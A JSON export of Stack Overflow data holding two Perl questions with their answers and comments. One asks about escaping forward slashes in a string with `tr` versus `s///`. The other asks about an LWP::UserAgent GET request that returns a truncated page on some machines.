4096 Oct 28 19:09 Test2\n-r--r--r--  1 root root  6393 Sep  6 16:40 Test2.pm\ndrwxrwxr-x  7 root root  4096 Nov 20 19:55 x86_64-linux-gnu-thread-multi\n</code></pre>\n"}, {"tags": ["perl", "replace", "escaping"], "answers": [{"comments": [{"owner": {"reputation": 5, "user_id": 11782471, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0134cf1f584d25dfb2c0ec7e7adbb349?s=128&d=identicon&r=PG&f=1", "display_name": "Tal", "link": "https://stackoverflow.com/users/11782471/tal"}, "edited": false, "score": 0, "creation_date": 1574316357, "post_id": 58968223, "comment_id": 104190835, "body": "Thank you so much! worked like a charm! i&#39;ve been searching forever!"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 5, "user_id": 11782471, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0134cf1f584d25dfb2c0ec7e7adbb349?s=128&d=identicon&r=PG&f=1", "display_name": "Tal", "link": "https://stackoverflow.com/users/11782471/tal"}, "edited": false, "score": 0, "creation_date": 1574317253, "post_id": 58968223, "comment_id": 104191167, "body": "There&#39;s also <code>$var = quotemeta($var);</code>. That would escape all non-word characters. (So <code>&#47;</code> and <code>.</code> in your example.)"}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 4, "last_activity_date": 1574316076, "creation_date": 1574316076, "answer_id": 58968223, "question_id": 58968198, "link": "https://stackoverflow.com/questions/58968198/escaping-forward-slashes-with-tr/58968223#58968223", "title": "Escaping forward slashes with tr", "body": "<p><code>tr</code> translates character for character. Use</p>\n\n<pre><code>$var =~ s/\\//\\\\\\//g;\n</code></pre>\n\n<p>Note that Perl allows you to change the delimiter for readability.</p>\n\n<pre><code>$var =~ s{/}{\\\\/}g;\n</code></pre>\n"}], "owner": {"reputation": 5, "user_id": 11782471, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0134cf1f584d25dfb2c0ec7e7adbb349?s=128&d=identicon&r=PG&f=1", "display_name": "Tal", "link": "https://stackoverflow.com/users/11782471/tal"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 45, "favorite_count": 0, "accepted_answer_id": 58968223, "answer_count": 1, "score": 0, "last_activity_date": 1579859187, "creation_date": 1574315935, "last_edit_date": 1579859187, "question_id": 58968198, "link": "https://stackoverflow.com/questions/58968198/escaping-forward-slashes-with-tr", "title": "Escaping forward slashes with tr", "body": "<p>I have a variable which contains <code>$var = \"/var/run/hello.pid\"</code>.</p>\n\n<p>In order to replace that I need to change those <code>/</code> into <code>\\/</code>. I was trying to use the Perl <code>tr</code> option like this:</p>\n\n<pre><code>$var =~ tr/\\//\\\\\\//;\n</code></pre>\n\n<p>But it takes only the first <code>\\</code>, ending up with <code>$var = \\var\\run\\hello.pid</code>.</p>\n\n<p>The outcome I'm expecting is: <code>$var = \\/var\\/run\\/hello.pid</code></p>\n\n<p>How can I achieve that with Perl? The <code>$var</code> variable can be generated randomly with those <code>/</code> (which means it's not a static variable).</p>\n"}, {"tags": ["perl", "httprequest", "httpresponse", "lwp-useragent"], "comments": [{"owner": {"reputation": 4234, "user_id": 12313309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3fPDo.jpg?s=128&g=1", "display_name": "Polar Bear", "link": "https://stackoverflow.com/users/12313309/polar-bear"}, "edited": false, "score": 1, "creation_date": 1574298643, "post_id": 58965667, "comment_id": 104186470, "body": "What is the <b>url</b> of the file? I could test it on my machine (Windows 10) and confirm what I will get."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1574302896, "post_id": 58965667, "comment_id": 104187475, "body": "How consistent is it? Do the machine that get the truncated version always get a truncated version?"}, {"owner": {"reputation": 1, "user_id": 9815075, "user_type": "registered", "profile_image": "https://graph.facebook.com/1413376388732454/picture?type=large", "display_name": "Tumar Temirova", "link": "https://stackoverflow.com/users/9815075/tumar-temirova"}, "reply_to_user": {"reputation": 4234, "user_id": 12313309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3fPDo.jpg?s=128&g=1", "display_name": "Polar Bear", "link": "https://stackoverflow.com/users/12313309/polar-bear"}, "edited": false, "score": 0, "creation_date": 1574360619, "post_id": 58965667, "comment_id": 104215548, "body": "@PolarBear the ulr is our company wiki confluence page with authorization."}, {"owner": {"reputation": 1, "user_id": 9815075, "user_type": "registered", "profile_image": "https://graph.facebook.com/1413376388732454/picture?type=large", "display_name": "Tumar Temirova", "link": "https://stackoverflow.com/users/9815075/tumar-temirova"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1574360926, "post_id": 58965667, "comment_id": 104215719, "body": "@ikegami yes, it is consistent, on machine where I get truncated version I always get truncated version, and on machine where I get whole page I get whole page always. I was wondering if perl has some limit configuration for http request, but couldn&#39;t find any documentation for that."}, {"owner": {"reputation": 1, "user_id": 9815075, "user_type": "registered", "profile_image": "https://graph.facebook.com/1413376388732454/picture?type=large", "display_name": "Tumar Temirova", "link": "https://stackoverflow.com/users/9815075/tumar-temirova"}, "edited": false, "score": 0, "creation_date": 1574362369, "post_id": 58965667, "comment_id": 104216393, "body": "I was able to get whole page for non auth get request page  my $resp = $ua-&gt;get( &#39;<a href=\"https://perldoc.perl.org/5.30.0/perlfaq.html\" rel=\"nofollow noreferrer\">perldoc.perl.org/5.30.0/perlfaq.html</a>&#39;, &#39;:content_file&#39;=&gt;&#39;test.txt&#39; );"}, {"owner": {"reputation": 11918, "user_id": 12098405, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-C7IUyuZ5qqE/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rehqQyGdh463Xz2DY8S4TYPhnDvzA/photo.jpg?sz=128", "display_name": "dash-o", "link": "https://stackoverflow.com/users/12098405/dash-o"}, "edited": false, "score": 0, "creation_date": 1575805980, "post_id": 58965667, "comment_id": 104682126, "body": "Run &#39;curl -v&#39; on the URL (with the authentication). It might provides you with clues as to the source of the problem - look at the header - content-length, etc. How big is the return content - is it exactly 32 K ?"}], "owner": {"reputation": 1, "user_id": 9815075, "user_type": "registered", "profile_image": "https://graph.facebook.com/1413376388732454/picture?type=large", "display_name": "Tumar Temirova", "link": "https://stackoverflow.com/users/9815075/tumar-temirova"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 55, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1574297846, "creation_date": 1574297846, "question_id": 58965667, "link": "https://stackoverflow.com/questions/58965667/perl-get-request-returns-only-half-page", "title": "Perl get request returns only half page", "body": "<p>I have a question here:\nFor some reason when I call get request in perl script, I am getting only half page.\nHowever this is happening only on certain machines, but on some machines it is returning whole page as expected.\nThe requested page size is only 64 kb, and perl is running on windows 7 (RAM 8GB, 64 bit OS).\nI just wondering if anyone have seen this issue before? Is there any way to solve it?\nThank you!\nHere is my code </p>\n\n<pre><code>use strict;\nuse warnings;\nuse File::Slurp;\nuse LWP::UserAgent;\n\n\nmy $ua = LWP::UserAgent-&gt;new;\n\n$ua-&gt;default_header( 'Authorization' =&gt; 'Basic [encoded credential]' );\n$ua-&gt;max_size(2000000000) ;\nmy $resp = $ua-&gt;get( 'url', ':content_file'=&gt;'test.txt' );\nsay $resp-&gt;status_line;\nmy $content = read_file('test.txt');\nprint $content;\n</code></pre>\n"}]